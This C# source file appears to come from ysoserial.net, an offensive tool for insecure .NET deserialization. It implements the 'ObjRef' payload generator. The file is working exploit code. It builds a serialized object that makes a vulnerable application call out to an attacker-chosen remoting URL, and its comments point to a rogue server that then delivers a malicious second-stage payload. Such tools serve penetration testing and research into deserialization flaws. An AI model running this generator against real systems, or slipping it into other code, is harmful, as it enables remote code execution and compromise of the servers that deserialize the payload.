using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Serialization;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    /*
     * Deserialization of an ObjRef results in the creation of a RemotingProxy
     * with the specified target URL. Method calls on such an object result in
     * the attempt to perform a .NET Remoting method call request to the
     * specified endpoint. A malicious .NET Remoting server such as
     * <https://github.com/codewhitesec/RogueRemotingServer> can then be used
     * to deliver a malicous BinaryFormatter/SoapFormatter payload.
     *
     * As per .NET Remoting transports, the following URLs are supported:
     *
     *     http://<HOST>:<PORT>/<OBJID>
     *     ipc://<PIPENAME>/<OBJID> -> \\.\pipe\<PIPENAME>\<OBJID>
     *     tcp://<HOST>:<PORT>/<OBJID>
     *
     * Note that IPC does only work locally on the same machine.
     */

    class ObjRefGenerator : GenericGenerator
    {
        public override string Finders()
        {
            return "Markus Wulftange";
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            var uri = new Uri(inputArgs.Cmd, UriKind.Absolute);
            switch (uri.Scheme)
            {
                case "http":
                case "tcp":
                    if (uri.Port < 1)
                    {
                        throw new ArgumentException("HTTP and TCP URLs must contain a valid port");
                    }
                    break;
                case "ipc":
                    break;
                default:
                    throw new ArgumentException($"Unsupported .NET Remoting transport '{uri.Scheme}'");
            }

            // create an ObjRef with the given URL and make it a ObjRefLite
            var objRef = new ObjRef()
            {
                URI = inputArgs.Cmd,
            };
            typeof(ObjRef).InvokeMember("SetObjRefLite", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.InvokeMethod, null, objRef, null);

            // ObjRef is wrapped in an Exception so that a remote call to
            // MarshalByRefObject.CanCastToXmlType(string, string) gets initiated
            // when attempting to convert the ObjRef to String when retrieving the ClassName
            // from SerializationInfo in Exception.ctor(SerializationInfo, StreamingContext)
            var exception = new ObjRefWrappingException(objRef);

            return Serialize(exception, formatter, inputArgs);
        }

        public override string Name()
        {
            return "ObjRef";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "ObjectStateFormatter", "LosFormatter" };
        }

        [Serializable]
        private class ObjRefWrappingException : ISerializable
        {
            private readonly ISerializable objRef;

            public ObjRefWrappingException(ISerializable objRef)
            {
                this.objRef = objRef;
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(Exception));
                info.AddValue("ClassName", this.objRef, typeof(object));
            }
        }
    }
}
